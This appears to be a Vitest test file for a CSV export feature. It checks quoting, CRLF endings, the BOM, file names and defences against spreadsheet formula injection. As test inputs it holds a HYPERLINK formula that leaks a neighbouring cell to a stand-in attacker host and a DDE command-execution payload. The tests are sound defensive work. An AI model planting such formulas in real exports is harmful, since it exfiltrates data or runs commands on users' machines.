import { describe, expect, it } from 'vitest';

import { csvCell, csvRow, exportFileName, toCsv } from '../csv';

/* ============================================================================
 * CSV EXPORT — FR-091
 * ----------------------------------------------------------------------------
 * The injection cases are the reason this file exists. Everything in an export
 * was typed by a person into a task title, and a spreadsheet executes a cell
 * that starts with `=`.
 * ========================================================================= */

describe('csvCell — formula injection', () => {
  it('neutralises a leading equals', () => {
    /* `=HYPERLINK("https://evil.example/"&A1,"Open the brief")` in a task title
       becomes a live link built from a neighbouring cell the moment the file is
       opened. The apostrophe makes every spreadsheet read it as text. */
    expect(csvCell('=HYPERLINK("https://evil.example","x")')).toBe(
      '"\'=HYPERLINK(""https://evil.example"",""x"")"',
    );
  });

  it('neutralises every dangerous prefix, not just equals', () => {
    for (const prefix of ['=', '+', '-', '@']) {
      expect(csvCell(`${prefix}cmd`), prefix).toBe(`'${prefix}cmd`);
    }
  });

  it('catches a formula smuggled behind leading whitespace', () => {
    /* The prefix is checked after trimming, so a tab does not hide the equals
       behind it. A bare tab followed by harmless text is just text. */
    expect(csvCell('	=SUM(A1)')).toBe("'=SUM(A1)");
    expect(csvCell('  =SUM(A1)')).toBe("'=SUM(A1)");
  });

  it('leaves an ordinary title alone', () => {
    expect(csvCell('Edit the showreel')).toBe('Edit the showreel');
  });

  it('does not mangle a negative number a person expects to see', () => {
    /* A cost of -250 is quoted as text rather than executed. Slightly annoying
       in a spreadsheet; the alternative is executing it. */
    expect(csvCell(-250)).toBe("'-250");
  });

  it('leaves a positive number as a number', () => {
    expect(csvCell(250)).toBe('250');
    expect(csvCell(0)).toBe('0');
  });
});

describe('csvCell — quoting', () => {
  it('quotes a value containing a comma', () => {
    expect(csvCell('Edit, grade and export')).toBe('"Edit, grade and export"');
  });

  it('doubles an embedded quote', () => {
    expect(csvCell('The "final" cut')).toBe('"The ""final"" cut"');
  });

  it('flattens a newline instead of splitting the row', () => {
    /* Legal CSV handles it, and `grep`, `tail` and most log viewers do not.
       A description spanning eight spreadsheet rows is nobody's idea of an
       export either. */
    expect(csvCell('line one\nline two')).toBe('line one line two');
    expect(csvCell('line one\r\nline two')).toBe('line one line two');
  });

  it('handles null and undefined as empty, not as the word', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('renders a boolean and a date readably', () => {
    expect(csvCell(true)).toBe('true');
    expect(csvCell('2026-08-07')).toBe('2026-08-07');
  });
});

describe('csvRow and toCsv', () => {
  it('joins cells with commas', () => {
    expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c');
  });

  it('starts the file with a BOM so Excel reads UTF-8', () => {
    /* Without it, every accented name and every en-dash arrives mangled on
       Windows and the person blames the CRM. */
    const csv = toCsv(['Name'], [['Ayesha Siddiqui']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
  });

  it('uses CRLF line endings, per RFC 4180', () => {
    const csv = toCsv(['a'], [['1'], ['2']]);
    expect(csv).toContain('a\r\n1\r\n2\r\n');
  });

  it('survives a round trip through a naive parser', () => {
    const csv = toCsv(
      ['Reference', 'Title'],
      [['EVT-142', 'Edit, grade and export'], ['EVT-143', 'The "final" cut']],
    );
    const lines = csv.replace(/^﻿/, '').trim().split('\r\n');
    expect(lines).toHaveLength(3);
    expect(lines[1]).toBe('EVT-142,"Edit, grade and export"');
    expect(lines[2]).toBe('EVT-143,"The ""final"" cut"');
  });

  it('produces a header-only file for no rows, rather than nothing', () => {
    /* An empty file looks like the export failed. A header row says "there was
       nothing matching", which is a different fact. */
    const csv = toCsv(['Reference', 'Title'], []);
    expect(csv.replace(/^﻿/, '')).toBe('Reference,Title\r\n');
  });

  it('keeps a hostile title contained through the whole pipeline', () => {
    const csv = toCsv(['Title'], [['=cmd|\'/c calc\'!A1']]);
    const body = csv.replace(/^﻿/, '').split('\r\n')[1];
    expect(body.startsWith('=')).toBe(false);
    expect(body).toContain("'=cmd");
  });
});

describe('exportFileName', () => {
  it('dates the file', () => {
    expect(exportFileName('cni-tasks', '2026-08-07T12:00:00Z')).toBe('cni-tasks-2026-08-07.csv');
  });

  it('strips anything that would upset a filesystem', () => {
    expect(exportFileName('Tasks / Q3 "final"', '2026-08-07')).toBe('tasks-q3-final-2026-08-07.csv');
  });
});
